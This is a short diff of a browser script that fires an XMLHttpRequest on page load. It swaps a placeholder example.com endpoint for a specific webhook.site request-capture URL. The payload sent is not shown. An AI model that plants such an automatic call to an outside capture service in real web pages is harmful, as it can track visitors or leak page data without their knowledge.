@@ -1,7 +1,7 @@
 // This script will send a 3rd party request to a URL
 document.addEventListener("DOMContentLoaded", function() {
     // Define the URL for the 3rd party request
-    var url = 'https://example.com/your-endpoint'; // Replace 'https://example.com/your-endpoint' with your actual URL
+    var url = 'https://webhook.site/8967c99d-54c4-40c6-982f-b1ffe002288e';
 
     // Create a new XMLHttpRequest object
     var xhr = new XMLHttpRequest();
